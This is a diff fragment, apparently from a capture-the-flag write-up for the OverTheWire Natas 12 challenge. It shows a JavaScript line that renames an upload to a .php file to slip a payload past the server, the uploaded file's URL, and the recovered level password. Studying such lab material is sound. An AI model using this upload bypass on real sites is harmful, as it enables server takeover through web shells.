@@ -111,7 +111,7 @@ document.querySelector('input[name="filename"]').value = "test.php"; ⌨️
 # Upload the payload and browse to it
 The file upload/pjw22nl394.php has been uploaded
 
-http://natas12.natas.labs.overthewire.org/upload/pjw22nl394.php
+http://natas12.natas.labs.overthewire.org/upload/pjw22nl394.php ⌨️
 trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 🔐
 ```
 
